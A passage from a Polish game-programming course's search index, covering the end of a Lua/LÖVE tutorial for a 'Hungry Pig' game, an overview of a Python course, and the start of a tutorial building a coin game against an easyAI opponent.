34)\\).</p> <pre><code>if Pig.dead then\n    love.graphics.setColor(love.math.colorFromBytes(227, 0, 34))\n    DrawCenteredText(Const.width / 2, Const.height / 2, \"GAME OVER\", Fonts.gameover)\nend\n</code></pre> <p>Ca\u0142o\u015b\u0107 dopisujemy na koniec cz\u0119\u015bci rysuj\u0105cej.</p> <pre><code>function love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Beet.drawable, Beet.x, Beet.y, 0, 1, 1, Beet.drawable.getWidth(Beet.drawable) / 2, Beet.drawable.getHeight(Beet.drawable) / 2)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\n    love.graphics.setColor(love.math.colorFromBytes(253, 238, 0))\n    DrawCenteredText(Const.width / 2, 50, Pig.points, Fonts.points)\n    if Pig.dead then\n        love.graphics.setColor(love.math.colorFromBytes(227, 0, 34))\n        DrawCenteredText(Const.width / 2, Const.height / 2, \"GAME OVER\", Fonts.gameover)\n    end\nend\n</code></pre> <p>Warto przetestowa\u0107, czy komunikat wy\u015bwietla si\u0119 poprawnie, tymczasowo zmieniaj\u0105c warto\u015b\u0107 zmiennej <code>Pig.dead</code> na true.</p>"},{"location":"learning-by-games/lua/hungry-pig/#sprawdzamy-wyjscie-poza-ekran","title":"Sprawdzamy wyj\u015bcie poza ekran","text":"<p>Nasza gra si\u0119 ko\u0144czy, gdy \u015bwinia wyjdzie poza ekran gry. Aby sprawdzi\u0107, czy tak si\u0119 sta\u0142o, wystarczy sprawdzi\u0107 warto\u015bci wsp\u00f3\u0142rz\u0119dnych naszej \u015bwini. Je\u017celi s\u0105 mniejsze od zera, albo wi\u0119ksze od odpowiednio szeroko\u015bci i wysoko\u015bci, to znaczy, \u017ce \u015bwinia wysz\u0142a poza ekran. Dopisujemy wi\u0119c odpowiedni warunek na koniec cz\u0119\u015bci aktualizuj\u0105cej.</p> <pre><code>if Pig.x &lt; 0 or Pig.x &gt; Const.width or Pig.y &lt; 0 or Pig.y &gt; Const.height then\nend\n</code></pre> <p>Gdy \u015bwinia wyjdzie poza ekran to gra si\u0119 ko\u0144czy, ustawiamy wi\u0119c zmienn\u0105 <code>Pig.dead</code> na warto\u015b\u0107 true.</p> <pre><code>if Pig.x &lt; 0 or Pig.x &gt; Const.width or Pig.y &lt; 0 or Pig.y &gt; Const.height then\n    Pig.dead = true\nend\n</code></pre> <p>Dla lepszego efektu mo\u017cemy tak\u017ce przemie\u015bci\u0107 \u015bwini\u0119 zaraz nad napis GAME OVER i zmieni\u0107 jej grafik\u0119 na <code>Pig.images.dead</code>.</p> <pre><code>if Pig.x &lt; 0 or Pig.x &gt; Const.width or Pig.y &lt; 0 or Pig.y &gt; Const.height then\n    Pig.dead = true\n    Pig.x = Const.width / 2\n    Pig.y = Const.height / 3\n    Pig.drawable = Pig.images.dead\nend\n</code></pre> <p>Tak teraz powinna wygl\u0105da\u0107 nasza cz\u0119\u015b\u0107 aktualizuj\u0105ca:</p> <pre><code>function love.update(dt)\n    Pig.x = Pig.x + Pig.vx * dt * Const.framerate\n    Pig.y = Pig.y + Pig.vy * dt * Const.framerate\n\n    if Collides(Pig, Beet) then\n        Beet.x = math.random(Const.margin, Const.width - Const.margin)\n        Beet.y = math.random(Const.margin, Const.height - Const.margin)\n        Pig.v = Pig.v + 0.8\n        Pig.points = Pig.points + 1\n    end\n\n    if Pig.x &lt; 0 or Pig.x &gt; Const.width or Pig.y &lt; 0 or Pig.y &gt; Const.height then\n        Pig.dead = true\n        Pig.x = Const.width / 2\n        Pig.y = Const.height / 3\n        Pig.drawable = Pig.images.dead\n    end\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#zamrozenie-rozgrywki","title":"Zamro\u017cenie rozgrywki","text":"<p>Gdy teraz przetestujemy nasz\u0105 gr\u0119, to zauwa\u017cymy, \u017ce rozgrywka dalej si\u0119 toczy po zako\u0144czeniu gry, tzn. dalej mo\u017cna porusza\u0107 \u015bwini\u0105 i zjada\u0107 buraki. Oczywi\u015bcie nie chcemy, by tak si\u0119 dzia\u0142o. W tym celu nale\u017cy dopisa\u0107 prost\u0105 instrukcj\u0119 warunkow\u0105 na pocz\u0105tek cz\u0119\u015bci aktualizuj\u0105cej, a tak\u017ce na pocz\u0105tek cz\u0119\u015bci odpowiedzialnej za odczytywanie klikni\u0119tych przycisk\u00f3w z klawiatury.</p> <pre><code>if Pig.dead then\n    return\nend\n</code></pre> <p>Dzi\u0119ki temu, je\u017celi gra jest ju\u017c zako\u0144czona, to \u017cadne dalsze instrukcje w danej cz\u0119\u015bci nie b\u0119d\u0105 ju\u017c wykonywane.</p>"},{"location":"learning-by-games/lua/hungry-pig/#peny-kod_3","title":"Pe\u0142ny kod","text":"<pre><code>function love.load()\n    math.randomseed(os.time())\n\n    Const = {width = 800, height = 800, margin = 50, framerate = 60}\n\n    Background = love.graphics.newImage(\"images/bg.png\")\n\n    Pig = {\n        x = Const.width / 2,\n        y = Const.height / 2,\n        vx = 0,\n        vy = 0,\n        v = 3,\n        points = 0,\n        dead = false,\n        images = {\n            left = love.graphics.newImage(\"images/pig_left.png\"),\n            right = love.graphics.newImage(\"images/pig_right.png\"),\n            up = love.graphics.newImage(\"images/pig_up.png\"),\n            down = love.graphics.newImage(\"images/pig_down.png\"),\n            dead = love.graphics.newImage(\"images/pig_dead.png\")\n        },\n        sound = love.audio.newSource(\"sounds/pig.wav\", \"static\")\n    }\n\n    Pig.drawable = Pig.images.down\n\n    Beet = {\n        x = 200,\n        y = 200,\n        drawable = love.graphics.newImage(\"images/beetroot.png\")\n    }\n\n    Fonts = {\n        points = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 60),\n        gameover = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 70)\n    }\nend\n\nfunction love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Beet.drawable, Beet.x, Beet.y, 0, 1, 1, Beet.drawable.getWidth(Beet.drawable) / 2, Beet.drawable.getHeight(Beet.drawable) / 2)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\n    love.graphics.setColor(love.math.colorFromBytes(253, 238, 0))\n    DrawCenteredText(Const.width / 2, 50, Pig.points, Fonts.points)\n    if Pig.dead then\n        love.graphics.setColor(love.math.colorFromBytes(227, 0, 34))\n        DrawCenteredText(Const.width / 2, Const.height / 2, \"GAME OVER\", Fonts.gameover)\n    end\nend\n\nfunction DrawCenteredText(x, y, text, font)\n    local textWidth = font:getWidth(text)\n    local textHeight = font:getHeight()\n    love.graphics.print(text, font, x, y, 0, 1, 1, textWidth/2, textHeight/2)\nend\n\nfunction love.update(dt)\n    if Pig.dead then\n        return\n    end\n\n    Pig.x = Pig.x + Pig.vx * dt * Const.framerate\n    Pig.y = Pig.y + Pig.vy * dt * Const.framerate\n\n    if Collides(Pig, Beet) then\n        Beet.x = math.random(Const.margin, Const.width - Const.margin)\n        Beet.y = math.random(Const.margin, Const.height - Const.margin)\n        Pig.v = Pig.v + 0.8\n        Pig.points = Pig.points + 1\n    end\n\n    if Pig.x &lt; 0 or Pig.x &gt; Const.width or Pig.y &lt; 0 or Pig.y &gt; Const.height then\n        Pig.dead = true\n        Pig.x = Const.width / 2\n        Pig.y = Const.height / 3\n        Pig.drawable = Pig.images.dead\n    end\nend\n\nfunction love.keypressed(key, scancode, isrepeat)\n    if Pig.dead then\n        return\n    end\n\n    if key == \"left\" then\n        Pig.vx = -Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.left\n    end\n\n    if key == \"right\" then\n        Pig.vx = Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.right\n    end\n\n    if key == \"up\" then\n        Pig.vx = 0\n        Pig.vy = -Pig.v\n        Pig.drawable = Pig.images.up\n    end\n\n    if key == \"down\" then\n        Pig.vx = 0\n        Pig.vy = Pig.v\n        Pig.drawable = Pig.images.down\n    end\nend\n\nfunction Collides(actor1, actor2)\n    return actor1.x + actor1.drawable.getWidth(actor1.drawable) &gt;= actor2.x and\n            actor1.x &lt;= actor2.x + actor2.drawable.getWidth(actor2.drawable) and\n            actor1.y + actor1.drawable.getHeight(actor1.drawable) &gt;= actor2.y and\n            actor1.y &lt;= actor2.y + actor2.drawable.getHeight(actor2.drawable)\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#restart-gry","title":"Restart gry","text":"<p>Warto doda\u0107 do naszej gry mo\u017cliwo\u015b\u0107 rozpocz\u0119cia ponownej rozgrywki, gdy gra ju\u017c si\u0119 zako\u0144czy. W ten spos\u00f3b nie b\u0119dziemy musieli wy\u0142\u0105cza\u0107 i ponownie w\u0142\u0105cza\u0107 okna gry. Zacznijmy od dodania pomocniczej funkcji restart, za pomoc\u0105 kt\u00f3rej przywr\u00f3cimy pocz\u0105tkowe ustawienia, takie jak: grafik\u0119 \u015bwini, pozycj\u0119 \u015bwini, pr\u0119dko\u015b\u0107 \u015bwini, punkty oraz stan gry. Funkcj\u0119 dopisujemy na samym dole naszego kodu.</p> <pre><code>function Restart()\n    Pig.drawable = Pig.images.down\n    Pig.x = Const.width / 2\n    Pig.y = Const.height / 2\n    Pig.vx = 0\n    Pig.vy = 0\n    Pig.v = 3\n    Pig.points = 0\n    Pig.dead = false\n    Pig.bot = false\nend\n</code></pre> <p>Teraz pozostaje pytanie: kiedy i w jaki spos\u00f3b restartowa\u0107 gr\u0119? Chcemy, aby gracz m\u00f3g\u0142 zrestartowa\u0107 rozgrywk\u0119 zaraz po jej zako\u0144czeniu. Powiedzmy, \u017ce jak gra si\u0119 ju\u017c zako\u0144czy\u0142a i gracz naci\u015bnie spacj\u0119, to rozpocznie si\u0119 kolejna rozgrywka. Dopiszmy wi\u0119c stosown\u0105 instrukcj\u0119 do funkcji <code>love.keypressed</code>.</p> <pre><code>function love.keypressed(key, scancode, isrepeat)\n    if Pig.dead then\n        if key == \"space\" then\n            Restart()\n        end\n\n        return\n    end\n\n    ...\n</code></pre> <p>Teraz mo\u017cemy ju\u017c restartowa\u0107 nasz\u0105 rozgrywk\u0119. Warto jeszcze wy\u015bwietli\u0107 dodatkowy komunikat po zako\u0144czeniu gry. Najpierw dodajmy now\u0105 czcionk\u0119 o rozmiarze \\(30\\) do naszego zbioru <code>Fonts</code>. Nazwiemy j\u0105 <code>tryagain</code>.</p> <pre><code>tryagain = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 30)\n</code></pre> <p>Powinni\u015bmy otrzyma\u0107 co\u015b takiego:</p> <pre><code>Fonts = {\n        points = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 60),\n        gameover = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 70),\n        tryagain = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 30)\n    }\n</code></pre> <p>Teraz mo\u017cemy wy\u015bwietli\u0107 komunikat. W cz\u0119\u015bci rysuj\u0105cej, zaraz pod komunikatem \"GAME OVER\", dopisujemy:</p> <pre><code>DrawCenteredText(Const.width / 2, 2 * Const.height / 3, \"Press SPACE to try again\", Fonts.tryagain)\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#peny-kod_4","title":"Pe\u0142ny kod","text":"<pre><code>function love.load()\n    math.randomseed(os.time())\n\n    Const = {width = 800, height = 800, margin = 50, framerate = 60}\n\n    Background = love.graphics.newImage(\"images/bg.png\")\n\n    Pig = {\n        x = Const.width / 2,\n        y = Const.height / 2,\n        vx = 0,\n        vy = 0,\n        v = 3,\n        points = 0,\n        dead = false,\n        images = {\n            left = love.graphics.newImage(\"images/pig_left.png\"),\n            right = love.graphics.newImage(\"images/pig_right.png\"),\n            up = love.graphics.newImage(\"images/pig_up.png\"),\n            down = love.graphics.newImage(\"images/pig_down.png\"),\n            dead = love.graphics.newImage(\"images/pig_dead.png\")\n        },\n        sound = love.audio.newSource(\"sounds/pig.wav\", \"static\")\n    }\n\n    Pig.drawable = Pig.images.down\n\n    Beet = {\n        x = 200,\n        y = 200,\n        drawable = love.graphics.newImage(\"images/beetroot.png\")\n    }\n\n    Fonts = {\n        points = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 60),\n        gameover = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 70),\n        tryagain = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 30)\n    }\nend\n\nfunction love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Beet.drawable, Beet.x, Beet.y, 0, 1, 1, Beet.drawable.getWidth(Beet.drawable) / 2, Beet.drawable.getHeight(Beet.drawable) / 2)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\n    love.graphics.setColor(love.math.colorFromBytes(253, 238, 0))\n    DrawCenteredText(Const.width / 2, 50, Pig.points, Fonts.points)\n    if Pig.dead then\n        love.graphics.setColor(love.math.colorFromBytes(227, 0, 34))\n        DrawCenteredText(Const.width / 2, Const.height / 2, \"GAME OVER\", Fonts.gameover)\n        DrawCenteredText(Const.width / 2, 2 * Const.height / 3, \"Press SPACE to try again\", Fonts.tryagain)\n    end\nend\n\nfunction DrawCenteredText(x, y, text, font)\n    local textWidth = font:getWidth(text)\n    local textHeight = font:getHeight()\n    love.graphics.print(text, font, x, y, 0, 1, 1, textWidth/2, textHeight/2)\nend\n\nfunction love.update(dt)\n    if Pig.dead then\n        return\n    end\n\n    Pig.x = Pig.x + Pig.vx * dt * Const.framerate\n    Pig.y = Pig.y + Pig.vy * dt * Const.framerate\n\n    if Collides(Pig, Beet) then\n        Beet.x = math.random(Const.margin, Const.width - Const.margin)\n        Beet.y = math.random(Const.margin, Const.height - Const.margin)\n        Pig.v = Pig.v + 0.8\n        Pig.points = Pig.points + 1\n    end\n\n    if Pig.x &lt; 0 or Pig.x &gt; Const.width or Pig.y &lt; 0 or Pig.y &gt; Const.height then\n        Pig.dead = true\n        Pig.x = Const.width / 2\n        Pig.y = Const.height / 3\n        Pig.drawable = Pig.images.dead\n    end\nend\n\nfunction love.keypressed(key, scancode, isrepeat)\n    if Pig.dead then\n        if key == \"space\" then\n            Restart()\n        end\n\n        return\n    end\n\n    if key == \"left\" then\n        Pig.vx = -Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.left\n    end\n\n    if key == \"right\" then\n        Pig.vx = Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.right\n    end\n\n    if key == \"up\" then\n        Pig.vx = 0\n        Pig.vy = -Pig.v\n        Pig.drawable = Pig.images.up\n    end\n\n    if key == \"down\" then\n        Pig.vx = 0\n        Pig.vy = Pig.v\n        Pig.drawable = Pig.images.down\n    end\nend\n\nfunction Restart()\n    Pig.drawable = Pig.images.down\n    Pig.x = Const.width / 2\n    Pig.y = Const.height / 2\n    Pig.vx = 0\n    Pig.vy = 0\n    Pig.v = 3\n    Pig.points = 0\n    Pig.dead = false\n    Pig.bot = false\nend\n\nfunction Collides(actor1, actor2)\n    return actor1.x + actor1.drawable.getWidth(actor1.drawable) &gt;= actor2.x and\n            actor1.x &lt;= actor2.x + actor2.drawable.getWidth(actor2.drawable) and\n            actor1.y + actor1.drawable.getHeight(actor1.drawable) &gt;= actor2.y and\n            actor1.y &lt;= actor2.y + actor2.drawable.getHeight(actor2.drawable)\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#pena-gra","title":"Pe\u0142na gra","text":"<p>Pe\u0142na implementacja dost\u0119pna jest poni\u017cej.</p> <p>G\u0142odna \u015bwinia</p>"},{"location":"learning-by-games/python/","title":"Python 3","text":"<p>Python jest bardzo przyjemnym j\u0119zykiem programowania. Co przez to rozumiem? Jego podstawowa sk\u0142adnia i semantyka s\u0105 \u0142atwe do przyswojenia, a mo\u017cliwo\u015bci zapewnione poprzez \u0142atwy dost\u0119p do najr\u00f3\u017cniejszych bibliotek s\u0105 ogromne. Jak ka\u017cdego jednak j\u0119zyka, tak\u017ce Pythona trzeba si\u0119 nauczy\u0107.</p> <p>Wi\u0119kszo\u015b\u0107 kurs\u00f3w programistycznych wygl\u0105da bardzo podobnie: poznajemy podstawy j\u0119zyka wykonuj\u0105c proste \u0107wiczenia, operuj\u0105ce przede wszystkim na liczbach, tekstach i wypisuj\u0105ce komunikaty do konsoli. W takich kursach cz\u0119sto osi\u0105gni\u0119ciem jest napisanie w\u0142asnej, uproszczonej wersji konsolowego kalkulatora, lub podobnego programu. Ca\u0142a interakcja z naszym programem sprowadza si\u0119 zwykle do wpisania danych w konsoli i obserwacji pojawiaj\u0105cych si\u0119, tekstowych komunikat\u00f3w. Jak to stwierdzi\u0142a kiedy\u015b moja uczennica: \"Gdy pokazuj\u0119 mojej mamie dzia\u0142anie swoich program\u00f3w, nie robi to na niej wra\u017cenia. Ot, jaki\u015b tekst pojawia si\u0119 na ekranie.\". I nic dziwnego! Jest to, kr\u00f3tko m\u00f3wi\u0105c, ma\u0142o imponuj\u0105ce, szczeg\u00f3lnie dla os\u00f3b, kt\u00f3re nie znaj\u0105 si\u0119 na programowaniu. A przecie\u017c gdy uczymy si\u0119 czego\u015b nowego to cz\u0119sto chcemy si\u0119 pochwali\u0107 zdobytymi umiej\u0119tno\u015bciami przed rodzin\u0105 i znajomymi!</p> <p>Jest to jeden z powod\u00f3w, dla kt\u00f3rych proponuj\u0119 inne podej\u015bcie do nauki programowania. Nauk\u0119 poprzez tworzenie gier i animacji. Jak ju\u017c wspomnia\u0142em, Python jest j\u0119zykiem o du\u017cych mo\u017cliwo\u015bciach, g\u0142\u00f3wnie za spraw\u0105 swoich bibliotek, ale tak\u017ce dzi\u0119ki swojej konstrukcji. </p> <p>Czas zacz\u0105\u0107! Pozw\u00f3lcie \u017ce b\u0119d\u0119 Waszym przewodnikiem podczas podr\u00f3\u017cy po programowaniu i tworzeniu gier.</p>"},{"location":"learning-by-games/python/#sugerowana-kolejnosc","title":"Sugerowana kolejno\u015b\u0107","text":"<p>Kurs jest podzielony na kilka cz\u0119\u015bci, tak \u017ceby ka\u017cdy m\u00f3g\u0142 znale\u017a\u0107 co\u015b dla siebie. Poni\u017cej postaram si\u0119 kr\u00f3tko opisa\u0107 ka\u017cd\u0105 z nich i to, dla kogo jest ona przeznaczona.</p>"},{"location":"learning-by-games/python/#wprowadzenie","title":"Wprowadzenie","text":"<p>Je\u017celi jeszcze nie mia\u0142e\u015b okazji, by nauczy\u0107 si\u0119 programowania, lub nie znasz j\u0119zka Python, to warto zacz\u0105\u0107 w\u0142a\u015bnie tutaj. Szybko nauczysz si\u0119 podstaw j\u0119zyka i my\u015blenia algorytmicznego poprzez tworzenie swoich w\u0142asnych gier. Chocia\u017c b\u0119dziesz tworzy\u0107 gry bez grafiki, to i tak b\u0119dzie przy tym du\u017co zabawy!</p>"},{"location":"learning-by-games/python/#gry-2d-pygame-zero","title":"Gry 2D - Pygame Zero","text":"<p>To tutaj zaczyna si\u0119 Twoja przygoda jako tw\u00f3rcy gier. Nauczysz si\u0119 tworzy\u0107 dwuwymiarowe gry i animacje, kt\u00f3rymi b\u0119dziesz m\u00f3g\u0142 si\u0119 pochwali\u0107 swoim bliskim i znajomym.</p> <p>Zanim przejdziesz do tej sekcji, warto \u017ceby\u015b zna\u0142 ju\u017c podstawy programowania w j\u0119zyku Python i umia\u0142 pos\u0142ugiwa\u0107 si\u0119 \u015brodowiskiem deweloperskim takim jak Pycharm.</p>"},{"location":"learning-by-games/python/#sztuczna-inteligencja","title":"Sztuczna inteligencja","text":"<p>Stworzenie przeciwnika w grze, kt\u00f3ry b\u0119dzie stanowi\u0142 wyzwanie, ale jednocze\u015bnie b\u0119dzie dawa\u0142 si\u0119 pokona\u0107 nie jest wcale takie trywialne! Dlatego warto nauczy\u0107 si\u0119, jak wykorzysta\u0107 sztuczn\u0105 inteligencj\u0119 do stworzenia odpowiedniego wyzwania.</p>"},{"location":"learning-by-games/python/#gry-sieciowe","title":"Gry sieciowe","text":"<p>Granie na jednym komputerze w pojedynk\u0119 lub z kilkoma innymi osobami jest \u015bwietn\u0105 zabaw\u0105, ale nie zawsze mo\u017cemy wszyscy zebra\u0107 si\u0119 w jednym miejscu. W takim przypadku warto wiedzie\u0107, jak stworzy\u0107 w\u0142asn\u0105 gr\u0119 sieciow\u0105, kt\u00f3ra pozwoli zagra\u0107 graczom z r\u00f3\u017cnych zak\u0105tk\u00f3w \u015bwiata.</p>"},{"location":"learning-by-games/python/ai/","title":"Sztuczna inteligencja","text":"<p>Stworzenie przeciwnika w grze, kt\u00f3ry b\u0119dzie stanowi\u0142 wyzwanie, ale jednocze\u015bnie b\u0119dzie dawa\u0142 si\u0119 pokona\u0107 nie jest wcale takie trywialne! Dlatego warto nauczy\u0107 si\u0119, jak wykorzysta\u0107 sztuczn\u0105 inteligencj\u0119 do stworzenia odpowiedniego wyzwania.</p>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/","title":"Gra w monety ze sztuczn\u0105 inteligencj\u0105","text":""},{"location":"learning-by-games/python/ai/game-of-coins-ai/#wstep","title":"Wst\u0119p","text":"<p>Gra w monety to jedna z gier dla dw\u00f3ch graczy, kt\u00f3rej zasady mo\u017cna bardzo szybko i \u0142atwo przyswoi\u0107. Na stole le\u017c\u0105 sobie monety, a gracze graj\u0105 na przemian. W swojej turze gracz mo\u017ce zabra\u0107 ze sto\u0142u \\(1\\), \\(3\\) lub \\(4\\) monety (o ile na stole pozosta\u0142a odpowiednia liczba monet). Gracz, kt\u00f3ry zabierze ze sto\u0142u ostatnie monety, przegrywa.</p> <p>Jak wida\u0107 jest to gra z prostymi zasadami, chocia\u017c nie koniecznie \u0142atwo w ni\u0105 wygra\u0107. Dlatego jest to idealna gra do zaprezentowania dzia\u0142ania sztucznej inteligencji.</p> <p>Tak, dzisiaj stworzymy gr\u0119, w kt\u00f3rej naszym przeciwnikiem b\u0119dzie komputer sterowany przez sztuczn\u0105 inteligencj\u0119!</p>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Tworzenia klas.</li> <li>Wykorzystania sztucznej inteligencji do wykonywania ruch\u00f3w.</li> </ul>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#biblioteka","title":"Biblioteka","text":"<p>W celu stworzenia gracza sterowanego przez sztuczn\u0105 inteligencj\u0119 skorzystamy z biblioteki easyAI. Najpierw musimy j\u0105 jednak zainstalowa\u0107. W terminalu wpisujemy poni\u017csze polecenie i zatwierdzamy przyciskiem enter.</p> <pre><code>pip install easyAI\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#klasa-gry","title":"Klasa gry","text":"<p>Na pocz\u0105tku nasza gra b\u0119dzie mia\u0142a charakter tekstowy. Dopiero p\u00f3\u017aniej, gdy podstawy b\u0119d\u0105 ju\u017c dzia\u0142a\u0107, dodamy do niej grafik\u0119. Zaczynamy wi\u0119c od stworzenia pliku <code>gameOfCoins.py</code> w kt\u00f3rym zapiszemy implementacj\u0119 naszej tekstowej gry.</p>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#importujemy-biblioteki","title":"Importujemy biblioteki","text":"<p>Na pocz\u0105tek wystarczy nam jedna biblioteka: easyAI. Poniewa\u017c b\u0119dziemy korzysta\u0107 z wielu modu\u0142\u00f3w tej biblioteki, zaimportujemy je wszystkie.</p> <pre><code>from easyAI import *\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#tworzymy-klase-gry","title":"Tworzymy klas\u0119 gry","text":"<p>Nasza gra b\u0119dzie opisana w osobnej klasie, poniewa\u017c taki jest wym\u00f3g biblioteki. Klasa w programowaniu to co\u015b jak schemat, wed\u0142ug kt\u00f3rego tworzymy r\u00f3\u017cne obiekty. Mo\u017cna sobie wyobrazi\u0107, \u017ce klasa to instrukcja konstrukcji samochodu, a obiekt to konkretny samoch\u00f3d. Mo\u017cemy mie\u0107 wiele samochod\u00f3w stworzonych wed\u0142ug tego samego schematu, ale r\u00f3\u017cni\u0105cych si\u0119 np. kolorem lakieru. Podobnie mo\u017cemy mie\u0107 kilka obiekt\u00f3w utworzonych na podstawie tej samej klasy.</p> <p>Nasz\u0105 klas\u0119 nazwiemy GameOfCoins i stworzymy w oparciu o klas\u0119 TwoPlayerGame z biblioteki easyAI.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#inicjalizujemy-obiekt-klasy","title":"Inicjalizujemy obiekt klasy","text":"<p>Klasa powinna mie\u0107 metod\u0119, kt\u00f3ra pozwoli nam na utworzenie nowego obiektu (instancji) klasy. Taka metoda ma specjaln\u0105 nazw\u0119: <code>__init__</code> (skr\u00f3t od initialization czyli inicjalizacja z angielskiego). Przy towrzeniu nowej gry powinni\u015bmy do niej przekaza\u0107 jeden parametr: informacj\u0119 na temat graczy.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    def __init__(self, players=None):\n</code></pre> <p>Wewn\u0105trz funkcji inicjalizuj\u0105cej zapami\u0119tujemy przekazany parametr w tworzonym obiekcie klasy, do kt\u00f3rego odnosimy si\u0119 poprzez s\u0142owo kluczowe self.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    def __init__(self, players=None):\n        self.players = players\n</code></pre> <p>Powinni\u015bmy tak\u017ce zdefiniowa\u0107 pocz\u0105tkow\u0105 liczb\u0119 monet na stole, np. \\(17\\). Liczb\u0119 monet zapami\u0119tamy w zmiennej pile.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    def __init__(self, players=None):\n        self.players = players\n        self.pile = 17\n</code></pre> <p>Na ko\u0144cu potrzebujemy jeszcze iformacji o tym, kt\u00f3ry z graczy zaczyna jako pierwszy. Jak to zwykle bywa, zaczyna gracz o numerze jeden.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    def __init__(self, players=None):\n        self.players = players\n        self.pile = 17\n        self.current_player = 1\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#okreslamy-dostepne-ruchy","title":"Okre\u015blamy dost\u0119pne ruchy","text":"<p>Przygotowali\u015bmy podwaliny pod nasz\u0105 gr\u0119, teraz czas okre\u015bli\u0107 jej regu\u0142y. Zaczniemy od listy dozwolonych ruch\u00f3w. W tym celu dopisujemy do naszej klasy metod\u0119 possible_moves.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def possible_moves(self):\n</code></pre> <p>Ruchy powinni\u015bmy zwr\u00f3ci\u0107 w formie listy ruch\u00f3w, a same ruchy powinny mie\u0107 format tekstowy (string). W naszej grze mamy trzy mo\u017cliwe ruchy, tak jak wspomnieli\u015bmy wcze\u015bniej.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def possible_moves(self):\n        return [\"1\", \"3\", \"4\"]\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#wykonujemy-ruch","title":"Wykonujemy ruch","text":"<p>Wiemy ju\u017c, jakie ruchy mo\u017cemy wykonywa\u0107 w grze. Co powinno si\u0119 jednak wydarzy\u0107 po wykonaniu ruchu? Jak powinien si\u0119 zmieni\u0107 stan gry? To musimy zdefiniowa\u0107 za pomoc\u0105 metody make_move, kt\u00f3ra jako parametr przyjmuje ruch do wykonania.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def make_move(self, move):\n</code></pre> <p>Po wykonaniu wybranego ruchu nasza liczba dost\u0119pnych monet powinna si\u0119 zmniejszy\u0107 o liczb\u0119 zgodn\u0105 z ruchem. Odejmujemy wi\u0119c warto\u015b\u0107 ruchu od zmiennej pile, pami\u0119taj\u0105c o tym, \u017ce najpierw musimy zamieni\u0107 ruch z tekstu na liczb\u0119 ca\u0142kowit\u0105.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def make_move(self, move):\n        self.pile -= int(move)\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#koniec-gry","title":"Koniec gry","text":"<p>Czas zadecydowa\u0107, kiedy gra si\u0119 ko\u0144czy. To okre\u015blamy za pomoc\u0105 funkcji is_over.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def is_over(self):\n</code></pre> <p>Nasza gra ko\u0144czy si\u0119, gdy sko\u0144cz\u0105 si\u0119 monety na stole. Sprawdzamy wi\u0119c stan pozosta\u0142ych monet i zwracamy stosown\u0105 informacj\u0119.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def is_over(self):\n        return self.pile &lt;= 0\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#wyswietlanie-stanu-gry","title":"Wy\u015bwietlanie stanu gry","text":"<p>W celu u\u0142atwienia sobie rozgrywki, tak \u017ceby\u015bmy nie musieli wszystkiego pami\u0119ta\u0107, warto co ka\u017cdy ruch wy\u015bwietla\u0107 stan obecnej gry. Do tego pos\u0142u\u017cy nam metoda show.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def show(self):\n</code></pre> <p>Z perspektywy gracza najwa\u017cniejsza jest liczba pozosta\u0142ych na stole monet, tak\u0105 wi\u0119c informacj\u0119 wy\u015bwietlamy na ekranie.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def show(self):\n        print(f\"{self.pile} monet pozosta\u0142o na 